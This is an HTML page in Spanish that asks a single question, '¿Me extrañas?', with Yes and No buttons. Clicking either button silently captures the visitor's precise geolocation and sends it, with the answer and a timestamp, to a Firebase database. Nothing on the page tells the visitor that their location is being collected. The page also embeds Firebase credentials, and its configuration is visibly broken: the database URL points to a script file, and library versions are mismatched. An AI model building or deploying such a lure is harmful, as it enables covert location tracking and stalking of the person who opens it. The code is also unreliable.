<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Mi Formulario</title>
    <style>
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
            font-family: Arial, sans-serif;
        }
        iframe {
            width: 100%; 
            max-width: 640px; 
            height: 500px;
        }
    </style>
    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
    <script>
        // Configuración de Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyCcC_CVxXfcbiHlq9x93yx6Lb4NBSlmvqg",
            authDomain: "geolo-43bb5.firebaseapp.com",
            databaseURL: "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js",
            projectId: "geolo-43bb5",
            storageBucket: "geolo-43bb5.firebasestorage.app",
            messagingSenderId: "309213681934",
            appId: "1:309213681934:web:8753dc4f4fc0d794b2df5f"
        };
        // Inicializar Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function getCurrentPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocalización no está soportada'));
                    return;
                }

                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            });
        }

        function sendLocation(response) {
            getCurrentPosition()
                .then(position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Enviar datos a Firebase
                    firebase.database().ref('ubicaciones').push({
                        respuesta: response,
                        latitud: latitude,
                        longitud: longitude,
                        timestamp: new Date().toISOString()
                    })
                    .then(() => {
                        console.log('Datos enviados a Firebase');
                    })
                    .catch((error) => {
                        console.error('Error enviando datos a Firebase:', error);
                    });
                })
                .catch(error => {
                    console.error('Error obteniendo la ubicación:', error);
                });
        }
    </script>
</head>
<body>
  <h1>¿Me extrañas?</h1>
  <button id="btnYes" onclick="sendLocation('Sí')">Sí</button>
  <button id="btnNo" onclick="sendLocation('No')">No</button>
</body>
</html>
